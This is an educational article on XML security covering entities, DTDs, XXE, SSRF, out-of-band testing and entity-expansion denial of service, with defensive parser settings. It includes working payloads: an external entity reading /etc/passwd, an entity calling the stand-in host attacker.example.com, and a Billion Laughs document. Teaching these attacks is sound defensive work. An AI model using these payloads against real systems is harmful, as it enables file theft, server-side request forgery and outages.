---
id: xml-security-xxe-entities-and-parser-attacks
title: "XML Security: XXE, entities, and XML parser traps"
team: red-blue
domain: web-security
section: vulnerabilities
type: knowledge
angle: parser-security-and-data-processing-mindset
sourceTrack: baw
tags:
  [
    "xml",
    "xxe",
    "external-entity",
    "entities",
    "dtd",
    "ssrf",
    "file-read",
    "dos",
    "billion-laughs",
    "quadratic-blowup",
    "web-security",
  ]
difficulty: medium
shortDescription: "An introduction to XML security: what entities, DTDs, and external XML entities are, why an XML parser can become a source of vulnerabilities, and how these mechanisms lead to XXE, SSRF, file read, and DoS attacks."
updatedAt: "2026-05-17"
---

# XML Security: XXE, entities, and XML parser traps

## Why this topic matters

XML may look like an old technology that is easy to ignore.

In practice, it still appears in many places: system-to-system integrations, SOAP, XML-RPC, configuration files, `.docx` documents, RSS feeds, image metadata, communication between services, and legacy APIs.

The problem is that XML is not just a “data format”.

XML can contain additional processing logic. It can define entities, load external resources, refer to files, expand values, and use DTD. If an application safely treats JSON as plain data, XML cannot always be treated the same way.

This is where an entire class of vulnerabilities begins.

The attacker is not immediately trying to “break the application” with a classic SQL Injection or XSS. They are trying to check whether the XML parser does too much work and whether it trusts the structure of a document supplied by the user.

## XML as data that must be interpreted by a parser

A simple XML document may look harmless:

```xml
<data>
  <transaction>
    <id>12345678</id>
    <amount>456.00</amount>
    <currency>PLN</currency>
    <comment>Book purchase</comment>
  </transaction>
</data>
```

For the application, this is just transaction data.

But an XML parser does not only see text. It has to understand the document structure, tags, values, attributes, special characters, and additional declarations.

Example: the `<` character has special meaning in XML because it marks the beginning of a tag. If we want to use it as normal text, we must write it as an entity:

```xml
<comment>I &lt;3 Sekurak!</comment>
```

After processing, the parser converts `&lt;` into `<`.

This is the first important mental model:

> An XML parser can transform one thing into another while processing the document.

Later vulnerabilities are based on the same mechanism.

## What XML entities are

Entities in XML work a bit like a “find and replace” mechanism.

There are built-in entities such as:

```xml
&lt;    <!-- < -->
&gt;    <!-- > -->
&amp;   <!-- & -->
&quot;  <!-- " -->
&apos;  <!-- ' -->
```

But XML also allows custom entities to be defined using DTD, which stands for Document Type Definition.

Example:

```xml
<!DOCTYPE data [
  <!ENTITY title "Web application security">
]>
<data>
  <transaction>
    <comment>For the book: &title;</comment>
  </transaction>
</data>
```

When the parser sees `&title;`, it replaces it with the entity value:

```text
Web application security
```

This alone does not have to be vulnerable.

The problem begins when an entity can point not only to a value defined inside the document, but also to an external resource.

## External entities

XML allows you to define an entity that loads content from an external source.

Example:

```xml
<!DOCTYPE data [
  <!ENTITY title SYSTEM "file.xml">
]>
```

In this case, the parser may try to load the contents of `file.xml` and insert it where the entity is used.

This is a very important moment.

If an application allows the user to provide XML, and the parser allows external entities, the user can try to point not only to a normal XML file, but also to a local file on the server or to a URL.

At that point, the parser starts performing actions that the business logic never actually needed.

## DTD as the place where the risk begins

DTD is usually located at the beginning of an XML document and starts with:

```xml
<!DOCTYPE ...>
```

This is where entities can be defined.

Example:

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "/etc/passwd">
]>
```

For a pentester, the presence of `<!DOCTYPE` in XML data is a signal to check whether the parser supports DTD and external entities.

For a developer or security engineer, it is the opposite signal:

> Does this application really need DTD?
> If not, the safest approach is to disable DTD processing completely.

## XXE, or XML External Entity

XXE, or XML External Entity, is a vulnerability where an application processes external XML entities in an unsafe way.

The most common results are:

- local file read from the server,
- HTTP requests made from the server’s perspective,
- SSRF,
- disclosure of configuration data,
- sometimes DoS through expensive document processing.

Example vulnerable scenario:

The application accepts XML:

```xml
<data>
  <transaction>
    <id>12345678</id>
    <amount>456.00</amount>
    <currency>PLN</currency>
    <comment>Purchase</comment>
  </transaction>
</data>
```

Then it returns the `id` value in the response:

```xml
<response>
  Transaction id=12345678 completed successfully!
</response>
```

If the parser supports external entities, an attacker may try something like this:

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<data>
  <transaction>
    <id>12345678&xxe;</id>
    <amount>456.00</amount>
    <currency>PLN</currency>
    <comment>Purchase</comment>
  </transaction>
</data>
```

If the application is vulnerable, the parser inserts the contents of `/etc/passwd` in place of `&xxe;`, and the response may disclose part of the file.

This is not magic.

The parser did exactly what it was allowed to do: it loaded an external entity and inserted its value into the document.

## XXE as SSRF

XXE is not only useful for reading files.

If the parser allows resources to be loaded over HTTP, you can check whether the server makes a request to a specified address:

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://attacker.example.com/test">
]>
<data>
  <transaction>
    <id>&xxe;</id>
  </transaction>
</data>
```

In a lab, instead of an attacker-controlled domain, you usually use a controlled endpoint, Burp Collaborator, or a simple HTTP server.

If the request appears on the controlled server, it means the application made an outbound connection.

This opens the path to SSRF, which means Server-Side Request Forgery.

In practice, you can then test whether the server can reach internal addresses, administrative services, cloud metadata endpoints, or panels accessible only from the internal network.

## When the application does not return the value in the response

Not every application returns the processed XML value in the response.

Sometimes the response looks only like this:

```xml
<response>
  Success!
</response>
```

In that case, classic XXE with file content reflected in the response may not work, because there is no place where the result is printed back.

But that does not mean the topic is closed.

This is when out-of-band XXE is tested. In this variant, the parser is forced to connect to an external server. The fact that the connection happens can confirm that the parser tries to resolve external entities.

This distinction is important:

- if the result comes back in the response, we are dealing with an easier, visible XXE case,
- if the result does not come back in the response, parser behavior must be tested through an external channel.

## Parameter entities

XML also has parameter entities, which are used inside DTD.

They are recognized by the `%` character.

Example:

```xml
<!DOCTYPE data [
  <!ENTITY % test "<!ENTITY value 'hello'>">
  %test;
]>
```

This looks strange, but the idea is simple: a parameter entity can dynamically build a fragment of the DTD.

In practice, parameter entities matter in more advanced XXE variants, especially when:

- normal entities cannot be used in a specific place,
- the value is inside an attribute,
- the application does not write the value back into the response,
- an external DTD must be loaded from a controlled server.

You do not need to memorize these payloads at the beginning.

You need to understand their purpose:

> Parameter entities allow you to influence the DTD definition, not only the text inside XML tags.

## Billion Laughs, or DoS through entity expansion

XXE is not the only problem.

If one entity can contain other entities, it is possible to build a document that is small as input but huge after processing.

The classic example is Billion Laughs:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

Each level expands the previous one many times.

The input file may be short, but the parser has to create a very large value in memory. If there are more levels, the application may consume a huge amount of RAM and stop responding.

This is a Denial of Service attack caused by XML processing behavior.

We are not attacking business logic here. We are attacking the cost of parsing data.

## Quadratic Blowup

Some parsers have protections against deeply nested entities.

That is not always enough.

Another variant involves defining one large entity and using it many times in the document.

Example model:

```xml
<!DOCTYPE data [
  <!ENTITY x "AAAAAAAAAA...very long value...">
]>
<data>
  &x;&x;&x;&x;&x;&x;&x;&x;
</data>
```

There are no many levels of nesting here.

Instead, there is one large value repeated many times.

The effect can be similar: a small input document causes very expensive processing on the server side.

This shows one important thing:

> Limiting only entity nesting depth is not enough. You also need to control input size, output size, and processing time.

## What to look for during security testing

During web application testing, XML should always trigger your attention when you see:

```http
Content-Type: application/xml
```

or:

```http
Content-Type: text/xml
```

or when the request body looks like XML:

```xml
<user>
  <id>1</id>
</user>
```

Then it is worth asking a few questions:

Does the application accept XML from the user?

Does the parser accept `<!DOCTYPE>`?

Does the parser process entities?

Is a value from the XML reflected in the response?

Does the application make outbound connections during parsing?

Can you trigger a parser error and see details in the response?

Is XML used only in the API, or also in file uploads, documents, imports, integrations, and admin panels?

This is the difference between looking at a single endpoint and looking at the whole data flow.

## Example of a safe defensive mindset

If the application does not need DTD, the safest option is to disable it.

If the application does not need external entities, external entity resolution must be disabled.

If the application has to process XML, the parser should have limits:

- maximum input file size,
- maximum parsing time,
- maximum number of entity expansions,
- maximum output size after expansion,
- no access to local files,
- no uncontrolled network connections.

It is also important not to trust the default configuration of the library.

Different languages and different parsers behave differently. What is safe in one library may be risky in another.

## How to understand this as a pentester

XXE does not start with a payload.

XXE starts with the question:

> Does the application give me control over an XML document that will later be processed by a server-side parser?

If yes, the next question is:

> Does the parser do anything more than simply read tags and values?

Only after that do we test:

- whether DTD works,
- whether entities work,
- whether external entities work,
- whether the result is reflected in the response,
- whether the server makes an outbound connection,
- whether a file can be read,
- whether SSRF is possible,
- whether the parser can be overloaded.

A payload is only a tool for testing a hypothesis.

The most important thing is understanding where the parser receives data and what it is allowed to do.

## How to understand this as someone defending the application

From a blue team and secure development perspective, XML becomes risky when the parser has too many permissions.

A safe parser should behave like a careful data reader, not like a mechanism that can:

- read local files,
- make HTTP connections,
- expand unlimited entities,
- fetch external DTDs,
- generate huge objects in memory.

If an application accepts XML, it is worth checking the parser configuration in the code and making sure it does not run in a too-permissive mode.

Filtering characters in the request body is not a good defense by itself.

A better defense is disabling unnecessary parser features.

## Minimal mental model

XML can contain DTD.

DTD can define entities.

Entities can be expanded by the parser.

External entities can point to files or URLs.

If the parser allows this, the application may unintentionally disclose files, make requests from the server, or consume too many resources.

That is why XXE and entity attacks are not “weird payloads”.

They are abuse of XML features that usually should not be available to user-supplied data in a web application.

## The most important idea

In XML, the vulnerability often does not come from complex application logic.

It comes from the parser receiving a document from the user while having features enabled that the application never actually needed.
